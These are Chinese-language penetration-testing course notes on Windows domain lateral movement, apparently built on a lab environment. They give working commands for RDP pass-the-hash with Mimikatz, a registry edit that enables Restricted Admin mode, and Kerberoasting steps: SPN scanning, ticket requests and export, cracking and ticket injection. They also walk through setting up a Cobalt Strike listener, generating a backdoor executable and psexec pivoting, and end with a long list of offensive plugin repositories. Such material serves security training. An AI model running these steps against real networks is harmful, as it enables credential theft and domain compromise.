# 思维导图

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-0.png)

# 知识点

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-1.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-2.png)

# 演示案例

## 域横向移动RDP传递-Mimikatz

除了之前讲到的IPC，WMI，SMB等协议的连接外，获取到的明文密码或HASH密文也可以通过RDP协议进行连接操作。

**RDP**

- 远程显示协议（Remote Display Protocol ）简称RDP，
- RDP是微软终端服务应用的协议。

RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断

### RDP明文密码连接

```shell
windows:
mstsc /console  /v :192.168.3.21：3389  /admin
linux: 
rdesktop 192.168.3.21:3389
```

 ![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-3.png)



### RDP密文HASH连接

- windows Server需要开启 **Restricted Admin mode**，
- 在Windows 8.1和Windows Server 2012 R2中默认开启
- 如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；



### 注册表修改开启HASH连接

```shell
REG ADD  "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin  
/t  REG_DWORD  /d  00000000  /f
```

###  开启后运行

```
mstsc.exe /restrictedadmin
mimikatz.exe
privilege::debug
sekurlsa::pth /user:administrator /domain :god  /ntlm 
:ccef208c6485269c20db2cad21734fe7  "/run:mstsc.exe /restrictedadmin"
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-4.png)



## 域横向移动SPN服务-探针，请求，导出，破解，重写

[kerberos中的spn详解](https://www.cnblogs.com/backlion/p/8082623.html)

SPN扫描也称为”扫描Kerberos服务实例名称”。**SPN扫描通过请求特定SPN类型的服务主体名称来查找服务**。与网络端口扫描相比，**SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口**(不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志)。因为SPN查询是Kerberos票据行为的一 部分，所以检测难度很大。

- <font color="red" size="3">**在活动目录中发现服务的最佳方法就是SPN扫描**</font> 

kerberoast下载：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

### 探针

```shell
setspn -q */*
setspn -q */* | findstr "MSSQL"
```

 ![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-5.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-6.png)

```shell
MSSQLSvc/mary-PC.god.org:1433
MSSQLSvc/mary-PC.god.org
MSSQLSvc/WebServer.god.org:1433
MSSQLSvc/WebServer.god.org
MSSQLSvc/fileserv.god.org:1433
MSSQLSvc/SqlServer.god.org:1433
MSSQLSvc/SqlServer.god.org
```

### 请求票据

```shell
# 删除缓存票据
klist purge

# powershell请求
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  "服务名"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  "MSSQLSvc/SqlServer.god.org:1433"

# mimikatz请求
mimikatz.exe  "kerberos::ask /target:xxxx"

# 查看票据
klist
```

 ![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-7.png)



### 导出票据

```shell
# mimikatz
.\mimikatz.exe  
kerberos::list /export
```

 ![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-8.png)

### 破解票据

```
# 破解工具tgsrepcrack.py python3环境运行
python tgsrepcrack.py  passwd.txt xxxx.kirbi
python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi
```

没有破解出来，可能是我的字典有问题！

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-9.png)

### 重写票据

```shell
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512
# 将生成的票据注入内存
mimikatz.exe kerberos::ptt xxxx.kirbi  
```

###  利用

```shell
dir //xxx.xxx.xxx.xxx /c$
```



## 域横向移动测试流程一把梭哈-CobaltStrike初体验

CobaltStrike4.0用户手册：https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q 提取码: taqu

CS神器大概流程：

启动—配置—监听—执行—上线—提权—信息收集(网络,凭证,定位等)—渗透

1.关于启动及配置讲解
2.关于提权及插件加载
3.关于信息收集命令讲解
4.关于视图自动化功能讲解

CobaltStrike Aggressor 脚本合集（可以自行在GitHub搜索）：

```shell
https://github.com/harleyQu1nn/AggressorScripts
https://github.com/Und3rf10w/Aggressor-scripts
https://github.com/001SPARTaN/aggressor_scripts
https://github.com/rasta-mouse/Aggressor-Script
https://github.com/threatexpress/aggressor-scripts
https://github.com/ramen0x3f/AggressorScripts
https://github.com/FortyNorthSecurity/AggressorAssessor
https://github.com/michalkoczwara/aggressor_scripts_collection
https://github.com/ars3n11/Aggressor-Scripts
https://github.com/gaudard/scripts/tree/master/red-team/aggressor
https://github.com/bluscreenofjeff/AggressorScripts
https://github.com/vysecurity/Aggressor-VYSEC
https://github.com/killswitch-GUI/CobaltStrike-ToolKit
https://github.com/rsmudge/ElevateKit （第三方提权攻击）
https://github.com/QAX-A-Team/CobaltStrike-Toolset
https://github.com/DeEpinGh0st/Erebus （Erebus CobaltStrike后渗透测试插件，持续更新）
https://github.com/branthale/CobaltStrikeCNA
https://github.com/pandasec888/taowu-cobalt-strike
```

### 启动CobaltStrike服务端

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-10.png)

#### 启动本地客户端

本地windows直接打开start.bat文件即可（需要java环境），输入账户名（随意），密码（服务器端设置的密码），连接即可。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-11.png)

##### 设置监听器

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-12.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-13.png)

有许多种协议类型的payload

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-15.png)

这里选择HTTP，设置端口5566（随意）,保存即可

![69-14](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-14.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-16.png)

##### 生成windows后门

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-17.png)

勾选上x64，防止不兼容，选择刚才设置的监听器webserver，generate生成exe木马。

![69-18](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-18.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-19.png)

##### 上线主机

生成的artifact.exe放到虚拟机webserver运行，webserver上一运行就崩溃，只能换一下其他的试试。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-20.png)

换了sqlserver的也是如此。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-21.png)

小迪视频中是可以执行的，上线主机。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/69-22.png)

无法复现实验，就先借鉴一下别人的总结。

参考：https://www.bilibili.com/read/cv14802167?spm_id_from=333.999.0.0

```
1.关于启动及配置讲解

启动

服务器：

需要Java环境支持

来到CobaltStrike所在的目录

运行“teamserver”，后面是安装CobaltStrike的服务器的IP，而后是工具链接服务器的密码

    ./teamserver [IP] [密码]

    ./teamserver 101.37.160.211 xiaodi

客户端：

需要Java环境支持

直接运行“start.bat”，Host为服务器IP，Port为50050，User随便填，Password为刚刚设定的密码，点链接

配置

配置监听器：

选择“Cobalt Strike”“Listeners”

选择“Add”，“Payload”选择木马回连的协议，这里选择HTTP；随便取个名字；“HTTP Host（Stager）”填服务器地址；“HTTP Port（C2）”填回连的端口

生成木马：

选择“Attacks”“Packages”，然后根据需要选择后门类型。这里选择“Windows Executable”，“Output”选择“Windows EXE”，勾选x64。“Listener”选择自己的监听器，点击“Generate”

选择保存木马的位置，填写名字，“保存”。注意会被杀软查杀

执行木马：

想办法将木马传输到目标机器并执行

在“Event Log”会提示对应IP的终端上线了，在Event Log和视图页面可以看见主机的名字和权限

2.关于提权及插件加载

在视图界面，选中机器右键。“Interact”，打开命令行终端；“Session”，链接的管理和笔记等功能；中间是包括端口扫描、黄金票据、运行MimiKatz等常用功能

选中机器右键，“Access”“Elevate”即提权功能，但默认只有两种提权方式，需要安装插件

选择合适的EXP和监听器，点击“Launch”提权，成功后会显示在视图界面

安装插件：

选择“Cobalt Strike”“Script Manager”，选择“Load”载入所需插件的.cna文件，将.cna文件“Unload”

提权速度过慢：

选择“Session”“Sleep”，设置为1或者0

3.关于信息收集命令讲解

在视图界面，选中SYSTEM权限的机器右键。“Interact”，打开命令行终端

输入“help”，查看命令

输入“getuid”，获取权限情况

输入“net view”，探测当前的网络环境

选择“View”“Targets”，会展示所有已探测的信息

输入“net computers”，探测所有的机器的名字与IP

输入“net dclist”，获取当前域控的信息

输入“net user”，获取当前用户信息

输入“shell net user /domain”，加“shell”调用cmd执行命令，得到域内所有用户的名字

选择“Access”“Run Mimikatz”或者输入“mimikatz”来运行mimikatz

选择“View”“Credentials”，会展示mimikatz收集的密码信息

回到“Targets”界面，选中一台机器，右键“Jump”，选择合适的攻击方法进攻。这里以“psexec”为例

可以选择收集到的密码来攻击，也可以手动填写，选择合适的监听器和负责攻击的会话，点击“Launch”

自主工具：

可以上传第三方工具，调用cmd执行，借助工具提高效率

代理问题：

确保信息能够传输回来


```

# 涉及资源：

kerberos中的spn详解：`https://www.cnblogs.com/backlion/p/8082623.html`

kerberoast：`https://github.com/nidem/kerberoast`

taowu-cobalt-strike（插件-小迪精选）：[https://github.com/pandasec888/taowu-cobalt-strike](https://github.com/pandasec888/taowu-cobalt-strike)

Cobalt Strike 4.0手册：https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q 提取码：dtm2

红队实战演练环境：https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug 提取码：taqu

```shell
Erebus（插件-小迪使用）：https://github.com/DeEpinGh0st/Erebus
（Cobalt Strike插件）：https://github.com/rsmudge/Elevatekit
（Cobalt Strike插件）：https://github.com/harleyQu1nn/AggressorScripts
（Cobalt Strike插件）：https://github.com/bluscreenofjeff/AggressorScripts
（Cobalt Strike插件）：https://github.com/michalkoczwara/aggressor_scripts_collection
（Cobalt Strike插件）：https://github.com/vysecurity/Aggressor-VYSEC
（Cobalt Strike插件）：https://github.com/killswitch-GUI/CobaltStrike-ToolKit
（Cobalt Strike插件）：https://github.com/ramen0x3f/AggressorScripts
（Cobalt Strike插件）：https://github.com/FortyNorthSecurity/AggressorAssessor
（Cobalt Strike插件）：https://github.com/threatexpress/persistence-aggressor-script
（Cobalt Strike插件）：https://github.com/threatexpress/aggressor-scripts
（Cobalt Strike插件）：https://github.com/branthale/CobaltStrikeCNA
（Cobalt Strike插件）：https://github.com/gaudard/scripts/tree/master/red-team/aggressor
（Cobalt Strike插件）：https://github.com/001SPARTaN/aggressor_scripts
（Cobalt Strike插件）：https://github.com/Und3rf10w/Aggressor-scripts
（Cobalt Strike插件）：https://github.com/rasta-mouse/Aggressor-Script
（Cobalt Strike插件）：https://github.com/vysec/Aggressor-VYSEC
（Cobalt Strike插件）：https://github.com/threatexpress/aggressor-scripts
（Cobalt Strike插件）：https://github.com/threatexpress/red-team-scripts
（Cobalt Strike插件）：https://github.com/vysecurity/CVE-2018-4878
（Cobalt Strike插件）：https://github.com/harleyQu1nn/AggressorScripts
（Cobalt Strike插件）：https://github.com/bluscreenofjeff/AggressorScripts
（Cobalt Strike插件）：https://github.com/QAX-A-Team/CobaltStrike-Toolset
（Cobalt Strike插件）：https://github.com/ars3n11/Aggressor-Scripts
（Cobalt Strike插件）：https://github.com/michalkoczwara/aggressor_scripts_collection
（Cobalt Strike插件）：https://github.com/killswitch-GUI/CobaltStrike-Toolkit
（Cobalt Strike插件）：https://github.com/ZonkSec/persistence-aggressor-script
（Cobalt Strike插件）：https://github.com/rasta-mouse/Aggressor-Script
（Cobalt Strike插件）：https://github.com/RhinoSecurityLabs/Aggressor-Scripts
（Cobalt Strike插件）：https://github.com/Kevin-Robertson/Inveigh
（Cobalt Strike插件）：https://github.com/Genetic-Malware/Ebowla
（Cobalt Strike插件）：https://github.com/001SPARTaN/aggressor_scripts
（Cobalt Strike插件）：https://github.com/gaudard/scripts/tree/master/red-team/aggressor
（Cobalt Strike插件）：https://github.com/branthale/CobaltStrikeCNA
（Cobalt Strike插件）：https://github.com/oldb00t/AggressorScripts
（Cobalt Strike插件）：https://github.com/p292/Phant0m_cobaltstrike
（Cobalt Strike插件）：https://github.com/p292/DDEAutoCS
（Cobalt Strike插件）：https://github.com/secgroundzero/CS-Aggressor-Scripts
（Cobalt Strike插件）：https://github.com/skyleronken/Aggressor-Scripts
（Cobalt Strike插件）：https://github.com/tevora-threat/aggressor-powerview
（Cobalt Strike插件）：https://github.com/tevora-threat/PowerView3-Aggressor
（Cobalt Strike插件）：https://github.com/threatexpress/persistence-aggressor-script
（Cobalt Strike插件）：https://github.com/FortyNorthSecurity/AggressorAssessor
（Cobalt Strike插件）：https://github.com/mdsecactivebreach/CACTUSTORCH
（Cobalt Strike插件）：https://github.com/C0axx/AggressorScripts
（Cobalt Strike插件）：https://github.com/offsecginger/AggressorScripts
（Cobalt Strike插件）：https://github.com/tomsteele/cs-magik
（Cobalt Strike插件）：https://github.com/bitsadmin/nopowershell
（Cobalt Strike插件）：https://github.com/SpiderLabs/SharpCompile 
```





# 参考

https://www.cnblogs.com/zhengna/p/15325215.html

https://www.bilibili.com/read/cv14802167?spm_id_from=333.999.0.0